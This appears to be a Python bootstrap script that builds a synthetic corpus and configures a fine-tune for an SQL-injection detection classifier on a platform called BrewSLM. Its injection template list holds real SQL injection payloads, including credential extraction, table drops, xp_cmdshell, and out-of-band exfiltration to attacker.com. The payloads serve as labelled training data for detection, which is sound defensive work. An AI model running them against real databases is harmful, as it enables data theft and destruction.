"""Bootstrap a complete SQL-injection-detector demo project on BrewSLM.

End-to-end: project + corpus + recipe + gold set + cleaning + data prep +
trainability forecast + training config (does NOT kick the GPU job).

Usage:
    cd backend && python scripts/bootstrap_sqli_demo.py [--api-base URL]

Defaults to http://localhost:8000/api with the admin bootstrap user.
"""

from __future__ import annotations

import argparse
import io
import json
import random
import sys
import tempfile
import time
from pathlib import Path
from typing import Any

import requests


DEFAULT_API_BASE = "http://localhost:8000/api"
ADMIN_USER = "admin"
ADMIN_PASS = "sk-mock-admin-key"

random.seed(42)  # reproducible bootstrap


# ─────────────────────────────────────────────────────────────────────
# Corpus generator — deterministic templates across 11 attack + 9
# benign categories. Mirrors the categories enumerated in the chat
# response so the gold set and training distribution stay aligned.
# ─────────────────────────────────────────────────────────────────────


INJECTION_TEMPLATES: dict[str, list[str]] = {
    "tautology": [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin' OR '1'='1' --",
        "x' OR 'a'='a",
        "' OR 'x'='x' --",
        '" OR ""="',
        "1' OR '2'='2",
        "anything' OR 1=1#",
    ],
    "union_based": [
        "1' UNION SELECT username, password FROM users--",
        "-1 UNION SELECT 1, version()--",
        "' UNION SELECT NULL, NULL, NULL FROM information_schema.tables--",
        "1 UNION ALL SELECT table_name FROM information_schema.tables--",
        "' UNION SELECT @@version, user(), database()--",
        "0 UNION SELECT credit_card FROM payments--",
        "' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables--",
    ],
    "error_based": [
        "1' AND extractvalue(1, concat(0x7e, version()))--",
        "1' AND updatexml(1,concat(0x7e,(SELECT user())),1)--",
        "' AND (SELECT 1 FROM (SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "1' AND CAST((SELECT password FROM users LIMIT 1) AS INT)--",
        "' AND convert(int, (SELECT @@version))--",
    ],
    "boolean_blind": [
        "1' AND substring(database(),1,1)='a",
        "1' AND ASCII(substring(user(),1,1))>64--",
        "' AND (SELECT count(*) FROM users WHERE username='admin')=1--",
        "1 AND IF(1=1, SLEEP(0), 0)--",
        "' AND LENGTH(database())>5--",
    ],
    "time_based_blind": [
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND SLEEP(5)--",
        "' OR pg_sleep(5)--",
        "1 AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--",
        "' AND BENCHMARK(5000000,MD5('A'))--",
    ],
    "stacked_queries": [
        "1; DROP TABLE users--",
        "1; INSERT INTO admins(username,password) VALUES('hacker','pwn')--",
        "1; UPDATE users SET password='owned' WHERE username='admin'--",
        "1; DELETE FROM logs--",
        "1; EXEC xp_cmdshell('net user')--",
    ],
    "comment_injection": [
        "admin'--",
        "admin'/*",
        "admin' #",
        "admin') /*",
        "user'/**/OR/**/1=1--",
    ],
    "url_encoded": [
        "1%27%20OR%201%3D1--",
        "%27%20UNION%20SELECT%201%2C2%2C3--",
        "admin%27--",
        "%27%20OR%20%271%27%3D%271",
        "1%27%3B%20DROP%20TABLE%20users--",
    ],
    "hex_unicode_obfuscated": [
        "1' OR 0x31=0x31--",
        "1′ OR ′1′=′1′--",
        "0x27 OR 0x27 = 0x27",
        "CHAR(39)+CHAR(32)+CHAR(79)+CHAR(82)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)",
        "1 OR 0x4F52='OR'",
    ],
    "second_order": [
        "Robert'); DROP TABLE Students;--",
        "alice'); INSERT INTO admin VALUES('attacker','pwn');--",
        "name'); SELECT * FROM passwords;--",
        "user'); UPDATE users SET role='admin' WHERE id=1;--",
    ],
    "out_of_band": [
        "1';EXEC xp_cmdshell('nslookup attacker.com')--",
        "1' UNION SELECT load_file('//attacker.com/share/data')--",
        "1' AND (SELECT * FROM users INTO OUTFILE '/tmp/leak.txt')--",
        "'; DECLARE @q VARCHAR(99); SET @q = (SELECT password FROM users); EXEC('master..xp_dirtree \"\\\\\\\\'+ @q +'.attacker.com\\\\share\"')--",
    ],
}


BENIGN_TEMPLATES: dict[str, list[str]] = {
    "legitimate_sql_query": [
        "SELECT name FROM products WHERE category = 'food'",
        "SELECT * FROM orders WHERE customer_id = 42",
        "SELECT COUNT(*) FROM users WHERE created_at > '2024-01-01'",
        "INSERT INTO logs(message) VALUES('user signed in')",
        "UPDATE users SET last_login = NOW() WHERE id = 17",
        "SELECT title, author FROM books ORDER BY published_at DESC LIMIT 10",
        "DELETE FROM sessions WHERE expires_at < NOW()",
        "SELECT u.name, p.title FROM users u JOIN posts p ON u.id = p.author_id",
        "CREATE INDEX idx_orders_customer ON orders(customer_id)",
    ],
    "names_with_apostrophes": [
        "O'Brien",
        "D'Angelo",
        "María José",
        "L'Oréal",
        "O'Connor",
        "D'Souza",
        "St. John's",
        "O'Hara",
        "Conan O'Brien",
        "John D'Amico",
    ],
    "search_queries_about_sql": [
        "how to write a SELECT statement",
        "difference between LEFT JOIN and INNER JOIN",
        "best practices for SQL injection prevention",
        "what does GROUP BY do in SQL",
        "tutorial: parameterized queries in Python",
        "SQL ORDER BY example",
        "how to escape single quotes in SQL strings",
    ],
    "code_comments_mentioning_attacks": [
        "// guard against ' OR 1=1 injections by parameterising",
        "# This regex matches the pattern used in old SQL injection attempts",
        "/* TODO: add unit test for the apostrophe escaping path */",
        "// reject inputs that look like UNION SELECT payloads",
        "# See: https://owasp.org/www-community/attacks/SQL_Injection",
        "// We use prepared statements precisely so OR 1=1 is harmless",
    ],
    "quoted_error_messages": [
        "Error: \"syntax error near '--'\"",
        "ParseError: unexpected token at column 12 — \"'\"",
        "Validation failed: name must not contain ';'",
        "Caught exception: NullReferenceException at line 42",
        "Failed: input length exceeded (300 chars)",
    ],
    "tutorial_text": [
        "In SQL, UNION combines results from SELECT queries.",
        "The DROP TABLE statement removes a table and all of its data.",
        "Use placeholders like ? or %s to safely insert user input.",
        "An OUTER JOIN includes rows even when the join condition fails.",
        "WHERE clauses filter rows before the SELECT projection runs.",
    ],
    "json_or_shell_input": [
        '{"id": 1, "name": "test"}',
        '{"event": "login", "user": "alice", "ts": "2026-05-30T10:11:00Z"}',
        "ls -la /var/log/",
        "curl -X POST https://api.example.com/v1/orders",
        "git commit -m 'fix bug in login flow'",
        "docker run --rm -v $(pwd):/data alpine sh",
    ],
    "math_or_logic_expressions": [
        "1 OR 2 = 3",
        "if (x > 0) return x; else return -x;",
        "result = a AND b OR c",
        "sin(theta) ** 2 + cos(theta) ** 2",
        "AND gate truth table",
    ],
    "very_short_inputs": [
        "a",
        "1",
        "''",
        "null",
        "0",
        "true",
        "name",
        "id",
        "test",
    ],
    "everyday_user_text": [
        "Can I get a refund for order #5821? Thanks!",
        "Forgot my password — please send a reset link.",
        "Loved the product, will buy again!",
        "Hi team, is the meeting still on for Tuesday?",
        "Adding two tickets for the family event this Saturday.",
        "Please update my shipping address to 221B Baker Street.",
    ],
}


def _expand_category(templates: list[str], target_count: int) -> list[str]:
    """Cycle through templates with minor variations until ``target_count``
    rows are produced. Variations cover whitespace, case, comment-style,
    trailing chars — the same dimensions a real WAF bypass corpus
    explores. Deterministic given the seed."""
    out: list[str] = []
    suffixes = ["", " ", "  ", " --", "/*x*/", "%20", "\t"]
    case_xforms = [lambda s: s, str.lower, str.upper, _alt_case]
    while len(out) < target_count:
        for base in templates:
            if len(out) >= target_count:
                break
            xform = random.choice(case_xforms)
            tail = random.choice(suffixes)
            out.append(xform(base) + tail)
    return out[:target_count]


def _alt_case(s: str) -> str:
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def build_corpus(n_per_class: int) -> list[dict[str, str]]:
    rows: list[dict[str, str]] = []
    inj_per_cat = max(1, n_per_class // len(INJECTION_TEMPLATES))
    for cat, templates in INJECTION_TEMPLATES.items():
        for text in _expand_category(templates, inj_per_cat):
            rows.append({"text": text, "label": "injection", "category": cat})
    ben_per_cat = max(1, n_per_class // len(BENIGN_TEMPLATES))
    for cat, templates in BENIGN_TEMPLATES.items():
        for text in _expand_category(templates, ben_per_cat):
            rows.append({"text": text, "label": "benign", "category": cat})
    random.shuffle(rows)
    return rows


def build_gold_set(per_attack: int = 18, per_benign: int = 22) -> list[dict[str, str]]:
    """Curated gold rows — uses the *base* templates (no augmentation),
    so the gold set is genuinely held-out from the training corpus's
    distribution variants. Mirrors the 11 attack + 9 benign categories
    the chat answer enumerated."""
    rows: list[dict[str, str]] = []
    for cat, templates in INJECTION_TEMPLATES.items():
        for text in templates[:per_attack]:
            rows.append({
                "text": text,
                "label": "injection",
                "category": cat,
                "difficulty": "medium",
                "criticality": "high",
            })
    for cat, templates in BENIGN_TEMPLATES.items():
        for text in templates[:per_benign]:
            rows.append({
                "text": text,
                "label": "benign",
                "category": cat,
                "difficulty": "medium",
                "criticality": "high",
            })
    random.shuffle(rows)
    return rows


# ─────────────────────────────────────────────────────────────────────
# HTTP client.
# ─────────────────────────────────────────────────────────────────────


class BrewClient:
    def __init__(self, api_base: str):
        self.api_base = api_base.rstrip("/")
        self.session = requests.Session()
        self.token = self._login()
        self.session.headers["Authorization"] = f"Bearer {self.token}"

    def _login(self) -> str:
        r = self.session.post(
            f"{self.api_base}/auth/local/login",
            json={"username": ADMIN_USER, "password": ADMIN_PASS},
            timeout=10,
        )
        r.raise_for_status()
        return r.json()["token"]

    def post(self, path: str, **kw: Any) -> Any:
        r = self.session.post(f"{self.api_base}{path}", timeout=120, **kw)
        if not r.ok:
            raise RuntimeError(f"POST {path} → {r.status_code}: {r.text[:400]}")
        return r.json() if r.text else None

    def put(self, path: str, **kw: Any) -> Any:
        r = self.session.put(f"{self.api_base}{path}", timeout=60, **kw)
        if not r.ok:
            raise RuntimeError(f"PUT {path} → {r.status_code}: {r.text[:400]}")
        return r.json() if r.text else None

    def get(self, path: str, **kw: Any) -> Any:
        r = self.session.get(f"{self.api_base}{path}", timeout=30, **kw)
        if not r.ok:
            raise RuntimeError(f"GET {path} → {r.status_code}: {r.text[:400]}")
        return r.json() if r.text else None


# ─────────────────────────────────────────────────────────────────────
# Bootstrap steps.
# ─────────────────────────────────────────────────────────────────────


def banner(label: str) -> None:
    print(f"\n── {label} " + "─" * (70 - len(label)))


def step_create_project(client: BrewClient) -> dict[str, Any]:
    banner("1. Create project")
    proj = client.post(
        "/projects",
        json={
            "name": f"SQLi Detector Demo {time.strftime('%Y%m%d-%H%M%S')}",
            "description": (
                "Binary text classifier for SQL injection detection. "
                "Bootstrapped end-to-end by scripts/bootstrap_sqli_demo.py. "
                "Synthesised corpus across 11 attack + 9 benign categories."
            ),
        },
    )
    print(f"  project_id = {proj['id']}")
    print(f"  name       = {proj['name']}")
    return proj


def step_apply_recipe(client: BrewClient, project_id: int) -> None:
    banner("2. Apply classification recipe")
    res = client.put(
        f"/projects/{project_id}/recipe",
        json={"recipe_id": "classification"},
    )
    base = res.get("base_model_name") or "(unset)"
    print(f"  recipe_id      = classification")
    print(f"  base_model     = {base}")
    print(f"  adapter_id     = classification-label")


def step_upload_corpus(
    client: BrewClient, project_id: int, rows: list[dict[str, str]]
) -> int:
    banner(f"3. Upload corpus ({len(rows)} rows) via dataset-import")
    # Write a temp JSONL the platform can pick up via the jsonl: source.
    tmp = Path(tempfile.gettempdir()) / f"sqli_corpus_{project_id}.jsonl"
    with tmp.open("w") as fp:
        for row in rows:
            fp.write(json.dumps({"text": row["text"], "label": row["label"]}) + "\n")
    print(f"  wrote {tmp} ({tmp.stat().st_size:,} bytes)")

    locator = f"jsonl:{tmp.as_posix()}"
    res = client.post(
        f"/projects/{project_id}/dataset-import/run",
        json={
            "locator": locator,
            "mapper_id": "label_to_classification",
            "field_map": {"text": "text", "label": "label"},
        },
    )
    inserted = res.get("inserted") or res.get("rows_inserted") or len(rows)
    print(f"  inserted = {inserted}")
    return inserted


def step_seed_gold(
    client: BrewClient, project_id: int, gold_rows: list[dict[str, str]]
) -> None:
    banner(f"4. Seed gold set ({len(gold_rows)} rows, 60/40 dev/test)")
    # Split deterministically — 60% dev (forecast watches this) /
    # 40% test (post-train eval).
    split = int(len(gold_rows) * 0.6)
    dev_rows = [{"text": r["text"], "label": r["label"]} for r in gold_rows[:split]]
    test_rows = [{"text": r["text"], "label": r["label"]} for r in gold_rows[split:]]
    res_dev = client.post(
        f"/projects/{project_id}/gold/import",
        json={"pairs": dev_rows, "dataset_type": "gold_dev"},
    )
    res_test = client.post(
        f"/projects/{project_id}/gold/import",
        json={"pairs": test_rows, "dataset_type": "gold_test"},
    )
    print(f"  gold_dev  = {res_dev.get('imported', len(dev_rows))} rows")
    print(f"  gold_test = {res_test.get('imported', len(test_rows))} rows")


def step_dataset_split(client: BrewClient, project_id: int) -> None:
    banner("5. Dataset prep — 80/10/10 train/val/test split")
    manifest = client.post(
        f"/projects/{project_id}/dataset/split",
        json={
            "train_ratio": 0.8,
            "val_ratio": 0.1,
            "test_ratio": 0.1,
            "seed": 42,
            "chat_template": "chatml",
        },
    )
    splits = manifest.get("splits") or {}
    train = splits.get("train")
    val = splits.get("val") or splits.get("validation")
    test = splits.get("test")
    print(f"  train={train}  val={val}  test={test}")
    adapter = manifest.get("adapter_id") or "(default)"
    print(f"  adapter      = {adapter}")


def step_data_health(client: BrewClient, project_id: int) -> None:
    banner("6. Data Health Report")
    report = client.get(f"/projects/{project_id}/data-health")
    print(f"  overall    = {report['overall']}")
    counts = report["severity_summary"]
    print(f"  ok={counts['ok']} warn={counts['warn']} block={counts['block']}")
    for group in report["groups"]:
        non_ok = [s for s in group["signals"] if s["severity"] != "ok"]
        if non_ok:
            print(f"  {group['title']}:")
            for sig in non_ok:
                line = f"    [{sig['severity']}] {sig['headline']}"
                print(line[:120])


def step_trainability_forecast(client: BrewClient, project_id: int) -> None:
    banner("7. Trainability forecast")
    try:
        forecast = client.get(f"/projects/{project_id}/training/forecast")
    except RuntimeError as e:
        print(f"  (skipped: {e})")
        return
    verdict = forecast.get("verdict") or forecast.get("overall") or "(unknown)"
    print(f"  verdict = {verdict}")
    for sig in (forecast.get("signals") or [])[:10]:
        sev = sig.get("severity", "?")
        line = f"  [{sev}] {sig.get('id', sig.get('name', '?'))}: {sig.get('headline', '')}"
        print(line[:120])


def step_create_experiment(client: BrewClient, project_id: int) -> dict[str, Any]:
    banner("8. Create training experiment (configured, NOT started)")
    config = {
        "base_model": "HuggingFaceTB/SmolLM2-135M-Instruct",
        "training_mode": "sft",
        "chat_template": "chatml",
        "task_type": "classification",
        # LoRA — standard small-classifier values.
        "use_lora": True,
        "lora_r": 8,
        "lora_alpha": 16,
        "lora_dropout": 0.05,
        "target_modules": ["q_proj", "v_proj"],
        # Hyperparameters.
        "batch_size": 32,
        "gradient_accumulation_steps": 1,
        "learning_rate": 2e-4,
        "lr_scheduler": "cosine",
        "warmup_ratio": 0.03,
        "weight_decay": 0.01,
        "num_epochs": 3,
        "max_seq_length": 256,
        "sequence_packing": False,  # classification rows are tiny; packing hurts loss-mask correctness
        # Compute.
        "bf16": True,
        "fp16": False,
        "gradient_checkpointing": False,  # not needed at this scale
        "flash_attention": True,
    }
    exp = client.post(
        f"/projects/{project_id}/training/experiments",
        json={
            "name": "sqli-baseline-smollm2-135m",
            "description": (
                "Baseline LoRA fine-tune for SQL injection detection. "
                "SmolLM2-135M, LoRA r=8 α=16, lr=2e-4, 3 epochs, "
                "max_seq=256, bf16."
            ),
            "config": config,
        },
    )
    print(f"  experiment_id = {exp['id']}")
    print(f"  status        = {exp['status']}")
    print(f"  base_model    = {exp['base_model']}")
    rc = exp.get("resolved_training_config") or {}
    print(f"  lora_r/alpha  = {rc.get('lora_r')}/{rc.get('lora_alpha')}")
    print(f"  lr            = {rc.get('learning_rate')}")
    print(f"  epochs        = {rc.get('num_epochs')}")
    print(f"  max_seq_length = {rc.get('max_seq_length')}")
    return exp


def step_summary(project_id: int, exp_id: int, api_base: str) -> None:
    banner("Done — what to click")
    print(f"  Project URL  : http://localhost:5173/project/{project_id}")
    print(f"  Data Health  : http://localhost:5173/project/{project_id}/pipeline/data")
    print(f"  Gold set     : http://localhost:5173/project/{project_id}/pipeline/goldset")
    print(f"  Training     : http://localhost:5173/project/{project_id}/training")
    print()
    print(f"  To kick the training job from the CLI:")
    print(f"  curl -X POST -H 'Authorization: Bearer $TOKEN' \\")
    print(f"       {api_base}/projects/{project_id}/training/experiments/{exp_id}/start")
    print()
    print("  Recommended next steps in the UI:")
    print("    1. Open Gold set — confirm 50/50 balance + spot-check 5 rows.")
    print("    2. Open Training tab — click 'Start' on the experiment.")
    print("    3. Watch the bell for progress; eval runs automatically on")
    print("       completion against gold_test.jsonl.")


# ─────────────────────────────────────────────────────────────────────
# Entry point.
# ─────────────────────────────────────────────────────────────────────


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--api-base", default=DEFAULT_API_BASE)
    parser.add_argument("--corpus-per-class", type=int, default=4000)
    args = parser.parse_args()

    client = BrewClient(args.api_base)

    proj = step_create_project(client)
    pid = int(proj["id"])

    step_apply_recipe(client, pid)

    corpus = build_corpus(n_per_class=args.corpus_per_class)
    step_upload_corpus(client, pid, corpus)

    gold = build_gold_set()
    step_seed_gold(client, pid, gold)

    step_dataset_split(client, pid)
    step_data_health(client, pid)
    step_trainability_forecast(client, pid)

    exp = step_create_experiment(client, pid)

    step_summary(pid, int(exp["id"]), args.api_base)
    return 0


if __name__ == "__main__":
    sys.exit(main())
